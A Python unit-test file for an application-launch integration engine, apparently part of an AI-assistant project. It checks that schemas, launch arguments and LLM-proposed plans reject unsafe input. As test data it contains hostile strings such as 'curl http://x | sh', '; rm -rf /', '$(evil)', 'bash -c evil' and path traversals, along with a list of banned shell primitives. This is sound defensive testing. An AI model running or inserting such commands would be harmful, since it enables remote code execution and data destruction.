"""Application integration engine tests (v0.3.0).

Covers, with mocks and temporary directories only:

* strict registry schema validation (invalid definitions rejected),
* identifier resolution (unknown ids/executables rejected),
* read-only discovery statuses (available / not installed /
  installed but unsupported / detection failed),
* discovery never launching, installing or spawning anything,
* the launch adapter's argv-only, shell=False contract,
* meta-checks that the apps package never contains shell-based
  execution primitives,
* planner/LLM rejection of arbitrary executables, flags and actions.

No real desktop application is ever started: ``popen`` and ``which``
are always injected fakes.
"""

from __future__ import annotations

import pathlib
import subprocess
import unittest

from ai_core.planner import PlanValidationError, describe_action, validate_action
from tests.test_command_parser import FakeLLMClient

from integrations.apps import discovery as discovery_mod
from integrations.apps import registry as registry_mod
from integrations.apps.launch import LaunchAdapter, LaunchError
from integrations.apps.registry import (
    BUILTIN_INTEGRATIONS,
    BUILTIN_REGISTRY,
    IntegrationRegistry,
    RegistryError,
    build_registry,
    resolve_integration_id,
    validate_integration,
)


def _minimal_definition(**overrides):
    """A valid definition to mutate in negative tests."""
    payload = {
        "id": "test-app",
        "name": "Test Application",
        "version": "1.0.0",
        "capabilities": ("open_file",),
        "file_types": (".txt",),
        "detection": {"executables": ("testapp",)},
        "launch": {
            "strategy": "exec",
            "executable": "testapp",
            "arguments": ("{path}",),
        },
        "verification": {"strategy": "process_started"},
        "required_permissions": ("open_file",),
    }
    payload.update(overrides)
    return payload


class TestRegistryValidation(unittest.TestCase):
    def test_builtin_registry_validates_at_import(self):
        self.assertGreaterEqual(len(BUILTIN_REGISTRY.ids), 5)
        self.assertIn("libreoffice-writer", BUILTIN_REGISTRY)
        self.assertIn("libreoffice-calc", BUILTIN_REGISTRY)
        self.assertIn("default", BUILTIN_REGISTRY)

    def test_minimal_definition_is_valid(self):
        definition = validate_integration(_minimal_definition())
        self.assertEqual(definition.id, "test-app")
        self.assertEqual(definition.launch.strategy, "exec")

    def _reject(self, payload, fragment):
        with self.assertRaises(RegistryError) as ctx:
            validate_integration(payload)
        self.assertIn(fragment, str(ctx.exception))

    def test_non_dict_rejected(self):
        with self.assertRaises(RegistryError):
            validate_integration("libreoffice")

    def test_unknown_top_level_key_rejected(self):
        self._reject(_minimal_definition(post_install="curl http://x | sh"),
                     "unexpected fields")

    def test_absolute_executable_rejected(self):
        self._reject(
            _minimal_definition(launch={
                "strategy": "exec",
                "executable": "/usr/bin/evil",
                "arguments": ("{path}",),
            }),
            "no path",
        )

    def test_executable_with_slash_or_traversal_rejected(self):
        for bad in ("../../bin/sh", "bin/evil", "./runme"):
            with self.subTest(bad=bad):
                self._reject(
                    _minimal_definition(launch={
                        "strategy": "exec",
                        "executable": bad,
                        "arguments": ("{path}",),
                    }),
                    "no path",
                )

    def test_shell_metacharacter_in_arguments_rejected(self):
        for bad in ("; rm -rf /", "$(evil)", "a|b", "a&&b", "`whoami`", "a>b"):
            with self.subTest(bad=bad):
                self._reject(
                    _minimal_definition(launch={
                        "strategy": "exec",
                        "executable": "testapp",
                        "arguments": (bad, "{path}"),
                    }),
                    "not an accepted value",
                )

    def test_shell_launch_strategy_rejected(self):
        self._reject(
            _minimal_definition(launch={
                "strategy": "shell",
                "executable": "testapp",
                "arguments": ("{path}",),
            }),
            "not allowed",
        )

    def test_path_placeholder_limits(self):
        self._reject(
            _minimal_definition(launch={
                "strategy": "exec",
                "executable": "testapp",
                "arguments": (),
            }),
            "at least one",
        )
        self._reject(
            _minimal_definition(launch={
                "strategy": "exec",
                "executable": "testapp",
                "arguments": ("--no-file",),
            }),
            "exactly one",
        )
        self._reject(
            _minimal_definition(launch={
                "strategy": "exec",
                "executable": "testapp",
                "arguments": ("{path}", "{path}"),
            }),
            "exactly one",
        )

    def test_unknown_capability_rejected(self):
        self._reject(_minimal_definition(capabilities=("execute_shell",)),
                     "unknown capability")

    def test_unknown_verification_strategy_rejected(self):
        self._reject(_minimal_definition(verification={"strategy": "keystroke"}),
                     "not allowed")

    def test_unknown_required_permission_rejected(self):
        self._reject(_minimal_definition(required_permissions=("install_software",)),
                     "unknown permission")

    def test_bad_identifier_and_version_rejected(self):
        self._reject(_minimal_definition(id="Evil App!"), "integration id")
        self._reject(_minimal_definition(version="latest"), "MAJOR.MINOR.PATCH")

    def test_no_python_import_field_exists(self):
        payload = _minimal_definition()
        payload["import"] = "os; subprocess"
        self._reject(payload, "unexpected fields")

    def test_duplicate_ids_rejected(self):
        with self.assertRaises(RegistryError):
            build_registry([_minimal_definition(), _minimal_definition()])

    def test_empty_registry_rejected(self):
        with self.assertRaises(RegistryError):
            IntegrationRegistry(())


class TestIdentifierResolution(unittest.TestCase):
    def test_resolves_ids_names_and_aliases(self):
        for token in (
            "libreoffice-calc",
            "LibreOffice Calc",
            "calc",
            "CALC",
            "  libreoffice   calc ",
        ):
            with self.subTest(token=token):
                self.assertEqual(
                    resolve_integration_id(token, BUILTIN_REGISTRY),
                    "libreoffice-calc",
                )

    def test_default_and_aliases(self):
        self.assertEqual(resolve_integration_id("system default", BUILTIN_REGISTRY),
                         "default")
        self.assertEqual(resolve_integration_id("xdg-open", BUILTIN_REGISTRY),
                         "default")
        self.assertEqual(resolve_integration_id("", BUILTIN_REGISTRY), "")
        self.assertEqual(resolve_integration_id("all", BUILTIN_REGISTRY), "")
        self.assertEqual(resolve_integration_id(None, BUILTIN_REGISTRY), "")

    def test_unknown_token_rejected_with_known_list(self):
        with self.assertRaises(RegistryError) as ctx:
            resolve_integration_id("notepadplusplus", BUILTIN_REGISTRY)
        self.assertIn("libreoffice-calc", str(ctx.exception))

    def test_executable_paths_never_resolve(self):
        for token in ("/usr/bin/soffice", "../../bin/sh", "soffice --calc",
                      "bash -c evil"):
            with self.subTest(token=token):
                with self.assertRaises(RegistryError):
                    resolve_integration_id(token, BUILTIN_REGISTRY)

    def test_non_string_rejected(self):
        with self.assertRaises(RegistryError):
            resolve_integration_id(42, BUILTIN_REGISTRY)


class TestDiscovery(unittest.TestCase):
    def setUp(self):
        self.registry = build_registry([_minimal_definition(
            id="test-app",
            detection={"executables": ("testapp",),
                       "desktop_entries": ("test-app",)},
        )])

    def test_status_available_when_executable_found(self):
        results = discovery_mod.detect_integrations(
            self.registry, which=lambda n: "/usr/bin/testapp", desktop_ids=set()
        )
        self.assertEqual(results[0].status, discovery_mod.STATUS_AVAILABLE)

    def test_status_not_installed_without_signals(self):
        results = discovery_mod.detect_integrations(
            self.registry, which=lambda n: None, desktop_ids=None
        )
        self.assertEqual(results[0].status, discovery_mod.STATUS_NOT_INSTALLED)
        self.assertIn("never installs", results[0].detail)

    def test_status_detection_failed_when_entry_exists_but_no_exec(self):
        results = discovery_mod.detect_integrations(
            self.registry, which=lambda n: None, desktop_ids={"test-app"}
        )
        self.assertEqual(results[0].status, discovery_mod.STATUS_DETECTION_FAILED)
        self.assertNotIn("available", results[0].detail.split("not reported")[0])

    def test_desktop_metadata_treated_as_untrusted(self):
        # A user-supplied file claiming an app is installed must not be
        # read; only sanitized *file names* in fixed dirs count.
        self.assertEqual(
            discovery_mod.sanitize_desktop_id("evil\x00name;rm.desktop"),
            "evil_name_rm",
        )
        self.assertEqual(discovery_mod.sanitize_desktop_id("org.gnome.Evince.desktop"),
                         "org.gnome.Evince")
        self.assertLessEqual(len(discovery_mod.sanitize_desktop_id("a" * 500 + ".desktop")),
                             128)

    def test_discovery_never_spawns_a_process(self):
        def boom(*args, **kwargs):  # pragma: no cover - must not run
            raise AssertionError("discovery must not start processes")

        original = subprocess.Popen
        subprocess.Popen = boom
        try:
            discovery_mod.detect_integrations(self.registry)
            # Nonexistent dirs only: this must not raise and must not
            # consult any real system directory beyond these.
            ids, errors = discovery_mod.list_desktop_ids(
                [pathlib.Path("/nonexistent/alwin-test")]
            )
            self.assertEqual(ids, set())
        finally:
            subprocess.Popen = original

    def test_unsupported_apps_reported(self):
        found = discovery_mod.find_unsupported_apps({"libreoffice-impress", "atril"})
        statuses = {f["status"] for f in found}
        self.assertEqual(statuses, {discovery_mod.STATUS_UNSUPPORTED})
        names = {f["name"] for f in found}
        self.assertIn("LibreOffice Impress", names)

    def test_missing_desktop_dir_is_not_an_error(self):
        ids, errors = discovery_mod.list_desktop_ids([pathlib.Path("/does/not/exist")])
        self.assertEqual(ids, set())
        self.assertEqual(errors, [])

    def test_detect_report_shape(self):
        report = discovery_mod.detect_report(
            self.registry,
            which=lambda n: None,
            desktop_dirs=[pathlib.Path("/does/not/exist")],
        )
        self.assertEqual(len(report["integrations"]), 1)
        self.assertIn("unsupported", report)
        self.assertIn("errors", report)


class FakeProcess:
    def __init__(self, returncode=None, pid=4321):
        self.pid = pid
        self._rc = returncode

    def poll(self):
        return self._rc


class TestLaunchAdapter(unittest.TestCase):
    def setUp(self):
        self.definition = BUILTIN_REGISTRY.get("libreoffice-calc")

    def test_argv_is_a_list_with_path_as_separate_element(self):
        adapter = LaunchAdapter(which=lambda n: "/usr/bin/soffice")
        argv = adapter.build_argv(
            self.definition, "/usr/bin/soffice", pathlib.Path("/tmp/s ales.xlsx")
        )
        self.assertIsInstance(argv, list)
        self.assertEqual(argv, ["/usr/bin/soffice", "--calc", "/tmp/s ales.xlsx"])

    def test_popen_receives_shell_false_and_no_string_command(self):
        calls = []

        def fake_popen(argv, **kwargs):
            calls.append((argv, kwargs))
            return FakeProcess(returncode=None)

        adapter = LaunchAdapter(popen=fake_popen, which=lambda n: "/usr/bin/soffice")
        outcome = adapter.launch(self.definition, pathlib.Path("/tmp/x.xlsx"))
        argv, kwargs = calls[0]
        self.assertFalse(kwargs["shell"])
        self.assertIsInstance(argv, list)
        self.assertEqual(kwargs["stdin"], subprocess.DEVNULL)
        self.assertTrue(outcome.started)

    def test_unavailable_application_fails_clearly(self):
        adapter = LaunchAdapter(popen=lambda *a, **k: FakeProcess(),
                                which=lambda n: None)
        with self.assertRaises(LaunchError) as ctx:
            adapter.launch(self.definition, pathlib.Path("/tmp/x.xlsx"))
        self.assertIn("never installs", str(ctx.exception))

    def test_immediate_nonzero_exit_is_launch_failure(self):
        adapter = LaunchAdapter(
            popen=lambda *a, **k: FakeProcess(returncode=3),
            which=lambda n: "/usr/bin/soffice",
        )
        with self.assertRaises(LaunchError) as ctx:
            adapter.launch(self.definition, pathlib.Path("/tmp/x.xlsx"))
        self.assertIn("status 3", str(ctx.exception))

    def test_clean_handoff_exit_zero_is_success(self):
        adapter = LaunchAdapter(
            popen=lambda *a, **k: FakeProcess(returncode=0),
            which=lambda n: "/usr/bin/xdg-open",
        )
        outcome = adapter.launch(
            BUILTIN_REGISTRY.get("default"), pathlib.Path("/tmp/x.txt")
        )
        self.assertTrue(outcome.started)

    def test_popen_oserror_becomes_launch_error(self):
        def failing_popen(*args, **kwargs):
            raise OSError(13, "Permission denied")

        adapter = LaunchAdapter(popen=failing_popen,
                                which=lambda n: "/usr/bin/soffice")
        with self.assertRaises(LaunchError):
            adapter.launch(self.definition, pathlib.Path("/tmp/x.xlsx"))

    def test_fallback_executable_used(self):
        adapter = LaunchAdapter(which=lambda n: (
            "/usr/bin/libreoffice" if n == "libreoffice" else None
        ))
        self.assertEqual(
            adapter.resolve_executable(self.definition), "/usr/bin/libreoffice"
        )

    def test_template_without_path_refused(self):
        # Schema layer: a template without {path} never enters a registry.
        with self.assertRaises(RegistryError):
            build_registry([_minimal_definition(
                launch={"strategy": "exec", "executable": "testapp",
                        "arguments": ("--no-file",)},
            )])
        # Defence in depth: build_argv still refuses a hand-built
        # definition that somehow skipped validation.
        from integrations.apps.registry import (
            DetectionStrategy,
            IntegrationDefinition,
            LaunchStrategy,
            VerificationStrategy,
        )

        broken = IntegrationDefinition(
            id="broken-app",
            name="Broken",
            version="1.0.0",
            capabilities=("open_file",),
            file_types=(".txt",),
            detection=DetectionStrategy(executables=("testapp",)),
            launch=LaunchStrategy(strategy="exec", executable="testapp",
                                  arguments=("--no-file",)),
            verification=VerificationStrategy(strategy="process_started"),
            required_permissions=("open_file",),
        )
        adapter = LaunchAdapter(which=lambda n: "/usr/bin/testapp")
        with self.assertRaises(LaunchError):
            adapter.build_argv(broken, "/usr/bin/testapp", pathlib.Path("/tmp/x.txt"))


class TestMetaSecurity(unittest.TestCase):
    """The apps package itself must never use shell-based execution."""

    def _sources(self):
        base = pathlib.Path(__file__).resolve().parent.parent / "integrations" / "apps"
        return {p: p.read_text(encoding="utf-8") for p in sorted(base.glob("*.py"))}

    def test_no_shell_execution_primitives(self):
        for path, source in self._sources().items():
            for banned in (
                "shell=True",
                "os.system(",
                "os.popen(",
                "subprocess.call(",
                "subprocess.run(",
                "subprocess.check_output(",
                "commands.getoutput(",
                "eval(",
                "exec(",
                "__import__(",
            ):
                with self.subTest(file=path.name, banned=banned):
                    self.assertNotIn(banned, source)

    def test_planner_never_executes_or_imports(self):
        source = (pathlib.Path(__file__).resolve().parent.parent
                  / "ai_core" / "planner.py").read_text(encoding="utf-8")
        for banned in ("shell=True", "os.system(", "eval(", "exec(",
                       "__import__("):
            self.assertNotIn(banned, source)


class TestPlannerRejectsArbitraryExecution(unittest.TestCase):
    def test_rejects_unknown_action(self):
        with self.assertRaises(PlanValidationError):
            validate_action({"action": "run_command", "command": "rm -rf /"})

    def test_rejects_arbitrary_executable_as_application(self):
        for bad in ("/usr/bin/python3", "bash", "sh -c id", "xdg-open --help"):
            with self.subTest(bad=bad), self.assertRaises(PlanValidationError):
                validate_action({"action": "open_file",
                                 "path": "Documents/a.txt",
                                 "application": bad})

    def test_rejects_extra_flag_fields(self):
        with self.assertRaises(PlanValidationError):
            validate_action({"action": "open_file", "path": "Documents/a.txt",
                             "application": "default", "flags": "--nofork"})
        with self.assertRaises(PlanValidationError):
            validate_action({"action": "open_file", "path": "Documents/a.txt",
                             "application": "default", "executable": "evil"})

    def test_rejects_non_openable_extensions(self):
        for bad in ("Documents/a.sh", "Documents/a.bin", "Documents/a.exe"):
            with self.subTest(bad=bad), self.assertRaises(PlanValidationError):
                validate_action({"action": "open_file", "path": bad,
                                 "application": "default"})

    def test_rejects_install_capability_from_model(self):
        with self.assertRaises(PlanValidationError):
            validate_action({"action": "open_file", "path": "Documents/a.txt",
                             "application": "libreoffice-writer",
                             "install_missing": True})

    def test_llm_proposal_with_unknown_app_is_rejected(self):
        from ai_core.planner import plan_via_llm

        client = FakeLLMClient(
            response='{"action": "open_file", "path": "Documents/a.txt",'
                     ' "application": "/usr/bin/evil"}'
        )
        with self.assertRaises(PlanValidationError):
            plan_via_llm("open a.txt with evil", client)

    def test_llm_proposal_with_shell_action_is_rejected(self):
        from ai_core.planner import plan_via_llm

        client = FakeLLMClient(
            response='{"action": "open_file", "path": "Documents/a.txt",'
                     ' "application": "default", "command": "id"}'
        )
        with self.assertRaises(PlanValidationError):
            plan_via_llm("open a.txt", client)

    def test_description_is_honest_about_read_only_detection(self):
        text = describe_action({"action": "detect_applications", "integration": ""})
        self.assertIn("read-only", text)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
